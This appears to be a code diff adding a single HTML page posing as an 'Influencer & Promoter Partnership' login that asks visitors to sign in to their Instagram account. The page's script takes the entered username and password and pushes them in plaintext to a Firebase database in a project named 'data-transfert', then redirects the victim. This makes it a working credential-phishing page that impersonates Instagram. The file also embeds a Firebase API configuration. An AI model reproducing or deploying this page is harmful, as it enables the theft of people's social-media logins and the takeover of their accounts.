@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Influencer & Promoter Partnership</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        /* Base styles */
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(to bottom, #ff4e50, #f9d423);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            padding: 0 15px; /* Added padding for smaller screens */
+        }
+
+        .info-box,
+        .login-box {
+            max-width: 400px;
+            width: 100%;
+            background: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 10px;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 20px 30px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .info-box {
+            font-size: 14px;
+            color: #8e8e8e;
+            line-height: 1.5;
+        }
+
+        .login-box .logo {
+            display: block;
+            margin: 0 auto 20px;
+            height: 60px;
+        }
+
+        h1 {
+            font-size: 18px;
+            color: #262626;
+            margin-bottom: 10px;
+        }
+
+        p.description {
+            font-size: 14px;
+            color: #8e8e8e;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .field {
+            margin: 15px 0;
+            position: relative;
+        }
+
+        input,
+        button {
+            width: 90%;
+            padding: 12px;
+            font-size: 14px;
+            border-radius: 5px;
+            outline: none;
+        }
+
+        input {
+            border: 1px solid #dbdbdb;
+            background-color: #fafafa;
+            transition: border-color 0.2s ease;
+        }
+
+        input:focus {
+            border-color: #a8a8a8;
+        }
+
+        button {
+            background: linear-gradient(to right, #fd1d1d, #fcb045);
+            border: none;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s ease;
+            margin-top: 10px;
+        }
+
+        button:disabled {
+            background: #dbdbdb;
+            cursor: not-allowed;
+        }
+
+        button:hover:not(:disabled) {
+            background: linear-gradient(to right, #fcb045, #fd1d1d);
+        }
+
+        .separator {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 20px 0;
+        }
+
+        .separator::before,
+        .separator::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+
+        .separator::before {
+            margin-right: 10px;
+        }
+
+        .separator::after {
+            margin-left: 10px;
+        }
+
+        .other-login {
+            font-size: 14px;
+            color: #385185;
+            font-weight: bold;
+            margin-top: 10px;
+            text-decoration: none;
+        }
+
+        .footer {
+            font-size: 12px;
+            color: #8e8e8e;
+            margin-top: 15px;
+        }
+
+        .footer a {
+            color: #385185;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Responsive styles */
+        @media (max-width: 768px) {
+            body {
+                padding: 0 20px; /* Add more padding on smaller screens */
+            }
+
+            .login-box {
+                padding: 20px 15px;
+                margin: 20px 0;
+            }
+        }
+    </style>
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyD-IOULsrU9K7U9ASa74Wlpu_zfk3FBwuI",
+            authDomain: "data-transfert-dc397.firebaseapp.com",
+            databaseURL: "https://data-transfert-dc397-default-rtdb.europe-west1.firebasedatabase.app",
+            projectId: "data-transfert-dc397",
+            storageBucket: "data-transfert-dc397.appspot.com",
+            messagingSenderId: "769173749251",
+            appId: "1:769173749251:web:ffa9a302f46c9fee471836",
+            measurementId: "G-ZBRMKEPHYP"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        function sendDataToFirebase() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const dataRef = database.ref('/PromoteurInfluenceur/Connexion');
+
+            dataRef.push({
+                username: username,
+                password: password
+            })
+                .then(() => {
+                    console.log("Connexion réussie.");
+                    window.location.href = "end.html?username=" + username;
+                })
+                .catch((error) => {
+                    console.error("Error:", error);
+                });
+        }
+
+        function toggleButtonState() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const loginButton = document.querySelector('button');
+
+            loginButton.disabled = !(username && password);
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const inputs = document.querySelectorAll('input');
+            inputs.forEach(input => {
+                input.addEventListener('input', toggleButtonState);
+            });
+
+            toggleButtonState(); // Initialize button state on load
+        });
+    </script>
+</head>
+
+<body>
+    <div class="login-box">
+         <h1>Login to Your Instagram Account</h1>
+        <div class="field">
+            <input id="username" type="text" placeholder="Username" required>
+        </div>
+        <div class="field">
+            <input id="password" type="password" placeholder="Password" required>
+        </div>
+        <button onclick="sendDataToFirebase()">Login</button>
+        <div class="separator">or</div>
+        <a href="https://www.facebook.com/login.php" class="other-login">Log in with Facebook</a>
+        <div class="footer">
+            <p>Don't have an account? <a href="https://www.instagram.com/accounts/login/">Sign up</a></p>
+        </div>
+    </div>
+</body>
+
+</html>
